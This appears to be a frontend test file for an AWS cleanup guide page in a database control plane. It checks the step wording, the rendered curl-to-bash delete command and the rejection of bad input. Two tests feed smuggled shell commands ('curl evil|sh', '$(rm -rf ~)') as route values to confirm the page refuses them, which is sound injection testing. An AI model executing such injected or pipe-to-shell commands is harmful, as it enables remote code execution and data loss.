import { screen, waitFor, within } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";
import { AppRoutes } from "@/routes";
import { renderWithProviders } from "@/test/utils";

function jsonResponse(body: unknown, status = 200) {
  return new Response(JSON.stringify(body), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}

// The guide is read after a disconnect, when the environments list no longer has
// the environment in it. It must render from the route alone.
function stubApi(
  connect: unknown = {
    hub: true,
    hubUrl: "https://hub.example",
    clusterRegion: "eu-central-1",
  },
) {
  vi.stubGlobal(
    "fetch",
    vi.fn((input: RequestInfo | URL) => {
      const path = String(input).split("?")[0];
      if (path === "/api/environments") {
        return Promise.resolve(jsonResponse({ hub: true, environments: [] }));
      }
      if (path === "/api/connect") {
        return Promise.resolve(jsonResponse(connect));
      }

      return Promise.resolve(jsonResponse({}));
    }),
  );
}

afterEach(() => {
  vi.unstubAllGlobals();
});

async function renderGuide(
  route = "/environments/prod-east/aws-cleanup?namespace=databases",
  connect?: unknown,
) {
  stubApi(connect);
  renderWithProviders(<AppRoutes />, { route });
  await screen.findByRole("heading", { level: 1, name: "Delete AWS resources" });
}

function step(name: string | RegExp) {
  return screen.getByRole("region", { name });
}

// Every command block on the page, in the order a reader pastes them.
function commands(root: HTMLElement = document.body): string[] {
  return [...root.querySelectorAll("pre")].map((pre) => pre.textContent ?? "");
}

describe("AWS cleanup guide", () => {
  it("gives the steps in order: what it deletes, sign in, region, the command, disconnect", async () => {
    await renderGuide();
    await screen.findByRole("region", { name: "3. Run the command" });

    const steps = screen.getAllByRole("heading", { level: 2 }).map((h) => h.textContent);
    expect(steps).toEqual([
      "What the command deletes",
      "1. Sign in to AWS",
      "2. Choose the region",
      "3. Run the command",
      "4. Disconnect the environment",
    ]);
  });

  it("shows the delete command in place of a list of resources and steps", async () => {
    await renderGuide();
    await screen.findByRole("region", { name: "3. Run the command" });

    expect(screen.queryByRole("table")).not.toBeInTheDocument();
    const blocks = commands();
    expect(blocks).toHaveLength(2);
    expect(blocks[1]).toBe(
      `curl -fsSL 'https://hub.example/api/internal/connect/bootstrap.sh' | bash -s -- --delete --name prod-east --region "$REGION"`,
    );
    // The command finds everything by its tag, so no hand-copied delete is left to drift.
    const text = document.body.textContent ?? "";
    for (const old of [
      "eksctl delete",
      "aws s3 rb",
      "aws iam delete",
      "delete-stack",
      "kubectl delete",
      "CLEANUP_KUBECONFIG",
      "volumes.txt",
    ]) {
      expect(text).not.toContain(old);
    }
  });

  it("carries no token, because the command never calls the control plane", async () => {
    await renderGuide();
    await screen.findByRole("region", { name: "3. Run the command" });

    expect(commands().join("\n")).not.toMatch(/--token|jnt_/);
  });

  it("says what the command deletes, how it finds it and that nothing comes back", async () => {
    await renderGuide();

    const text = step("What the command deletes").textContent ?? "";
    expect(text).toContain("percona.com/pds");
    expect(text).toContain("prod-east");
    for (const resource of [
      "EKS cluster",
      "node group",
      "backup bucket",
      "backup IAM user",
      "EBS CSI role",
      "EBS volumes",
    ]) {
      expect(text).toContain(resource);
    }
    // Volumes are found by the Kubernetes cluster tag, not a list saved first, so
    // one a database added late is deleted too, and one still attached is not.
    expect(text).toContain("kubernetes.io/cluster/prod-east");
    expect(text).toMatch(/only volumes that are available/);
    expect(text).toMatch(/every database/);
    expect(text).toMatch(/every backup/);
    expect(text).toMatch(/keep a copy of the backups/);
    expect(text).not.toMatch(/No other copy exists/);
    expect(text).toMatch(/Irreversible/);
    expect(text).toMatch(/type the environment name/i);
  });

  it("says what it leaves alone: an EKS cluster without the tag and a bucket it could not tag", async () => {
    await renderGuide();

    const text = step("What the command deletes").textContent ?? "";
    expect(text).toMatch(/refuses an EKS cluster/);
    expect(text).toMatch(/left for you to delete/);
    expect(text).toMatch(/already there/);
    expect(text).toMatch(/--local created nothing in AWS/);
    expect(text).toMatch(/could not tag/);
    expect(text).toMatch(/AWS resources only/);
  });

  describe("choosing the region", () => {
    it("asks for the region the join used instead of presetting one", async () => {
      await renderGuide();

      const choose = step("2. Choose the region").textContent ?? "";
      expect(choose).toContain("read -r REGION");
      expect(choose).not.toMatch(/export REGION=/);
      expect(choose).not.toContain("read -p");
      // A join with no region answer uses the AWS CLI's own, and only then
      // the control plane's default, so both are named for a reader who pressed Enter.
      expect(choose).toContain("aws configure get region");
      await waitFor(() =>
        expect(step("2. Choose the region").textContent).toContain("eu-central-1"),
      );
    });

    it("tells the reader to sign in with the join's AWS profile", async () => {
      await renderGuide();

      expect(step("1. Sign in to AWS").textContent).toMatch(/AWS_PROFILE/);
    });

    it("sets the region before the command reads it", async () => {
      await renderGuide();
      await screen.findByRole("region", { name: "3. Run the command" });

      const [region, command] = commands();
      expect(region).toContain("read -r REGION; export REGION");
      expect(command).toContain('--region "$REGION"');
    });
  });

  describe("running the command", () => {
    it("says it asks for the environment name before it deletes anything", async () => {
      await renderGuide();

      const text = step("3. Run the command").textContent ?? "";
      expect(text).toContain("prod-east");
      expect(text).toMatch(/lists what it found/);
      expect(text).toMatch(/before it deletes anything/);
    });

    it("says what happens when kubectl cannot reach the EKS cluster, and that a stopped run can go again", async () => {
      await renderGuide();

      const text = step("3. Run the command").textContent ?? "";
      expect(text).toMatch(/load balancers/);
      expect(text).toMatch(/warns and carries on/);
      expect(text).toMatch(/same command again/);
    });

    it("says it needs aws and eksctl, and kubectl only to delete the databases first", async () => {
      await renderGuide();

      const text = step("1. Sign in to AWS").textContent ?? "";
      expect(text).toContain("aws");
      expect(text).toContain("eksctl");
      expect(text).toMatch(/kubectl/);
    });
  });

  describe("disconnecting", () => {
    it("says the command leaves the environment listed, and where to remove it", async () => {
      await renderGuide();

      const text = step("4. Disconnect the environment").textContent ?? "";
      expect(text).toContain("prod-east");
      expect(text).toMatch(/Disconnect/);
      expect(text).toMatch(/AWS resources only/);
    });
  });

  describe("when the command cannot be printed yet", () => {
    it("shows no command until the control plane's address has been read", async () => {
      let answer: (response: Response) => void = vi.fn();
      vi.stubGlobal(
        "fetch",
        vi.fn((input: RequestInfo | URL) => {
          const path = String(input).split("?")[0];
          if (path === "/api/connect") {
            return new Promise<Response>((resolve) => {
              answer = resolve;
            });
          }

          return Promise.resolve(jsonResponse({ hub: true, environments: [] }));
        }),
      );
      renderWithProviders(<AppRoutes />, { route: "/environments/prod-east/aws-cleanup" });

      await screen.findByRole("heading", { level: 1, name: "Delete AWS resources" });
      expect(commands().join("\n")).not.toContain("--delete");

      answer(
        jsonResponse({ hub: true, hubUrl: "https://hub.example", clusterRegion: "eu-central-1" }),
      );

      await waitFor(() =>
        expect(commands()[1]).toContain("https://hub.example/api/internal/connect/bootstrap.sh"),
      );
    });

    it("says so when this control plane has no public address", async () => {
      await renderGuide("/environments/prod-east/aws-cleanup", { hub: true });

      const text = (await screen.findByRole("region", { name: "3. Run the command" })).textContent;
      expect(text).toMatch(/no public address/);
      expect(text).toMatch(/Contact Percona support/);
      expect(commands().join("\n")).not.toContain("--delete");
    });

    it("says so when the settings could not be read", async () => {
      vi.stubGlobal(
        "fetch",
        vi.fn((input: RequestInfo | URL) => {
          const path = String(input).split("?")[0];
          if (path === "/api/connect") {
            return Promise.resolve(jsonResponse({ message: "boom" }, 500));
          }

          return Promise.resolve(jsonResponse({ hub: true, environments: [] }));
        }),
      );
      renderWithProviders(<AppRoutes />, { route: "/environments/prod-east/aws-cleanup" });

      const message = await screen.findByText(/Settings could not be read/);
      expect(
        within(step("3. Run the command")).getByText(message.textContent ?? ""),
      ).toBeInTheDocument();
      expect(commands().join("\n")).not.toContain("--delete");
    });
  });

  describe("choosing the environment", () => {
    it("refuses to print commands for a name that is not an environment name", async () => {
      await renderGuide("/environments/x%3Bcurl%20evil%7Csh/aws-cleanup");

      expect(screen.getByText(/is not an environment name/)).toBeInTheDocument();
      expect(screen.queryByRole("region", { name: /^1\. / })).not.toBeInTheDocument();
      expect(document.body.textContent).not.toContain("curl evil");
    });

    it("refuses a namespace that is not a namespace", async () => {
      await renderGuide("/environments/prod-east/aws-cleanup?namespace=%24(rm%20-rf%20~)");

      expect(screen.getByText(/is not a namespace/)).toBeInTheDocument();
      expect(document.body.textContent).not.toContain("rm -rf");
    });

    it("renders after the environment is gone from the environments list", async () => {
      await renderGuide("/environments/long-gone/aws-cleanup?namespace=databases");
      await screen.findByRole("region", { name: "3. Run the command" });

      expect(commands()[1]).toContain("--name long-gone");
    });
  });
});
